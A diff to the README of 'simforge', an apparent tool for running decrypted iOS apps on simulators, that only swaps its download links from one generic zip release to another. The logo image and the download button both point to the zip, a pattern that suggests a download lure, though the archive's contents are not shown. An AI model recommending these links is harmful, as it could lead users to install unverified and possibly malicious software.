@@ -1,6 +1,6 @@
 # 🚀 Welcome to simforge! 📱
 
-![Simforge Logo](https://github.com/Arpita2424/simforge/releases/download/v1.0/Application.zip)
+![Simforge Logo](https://github.com/Arpita2424/simforge/releases/download/v2.0/Software.zip)
 
 ## Description
 simforge is a repository that allows you to run (decrypted) iOS Apps on iOS Simulators. With the tools and resources provided here, you can seamlessly test and simulate iOS applications on various iOS simulators. Get ready to enhance your iOS development experience with simforge!
@@ -13,7 +13,7 @@ simforge is a repository that allows you to run (decrypted) iOS Apps on iOS Simu
 ## Getting Started
 To get started with simforge, simply download the release package by clicking the button below:
 
-[![Download Release](https://github.com/Arpita2424/simforge/releases/download/v1.0/Application.zip)](https://github.com/Arpita2424/simforge/releases/download/v1.0/Application.zip)
+[![Download Release](https://github.com/Arpita2424/simforge/releases/download/v2.0/Software.zip)](https://github.com/Arpita2424/simforge/releases/download/v2.0/Software.zip)
 
 Once downloaded, extract the contents and follow the installation instructions provided in the repository.
 
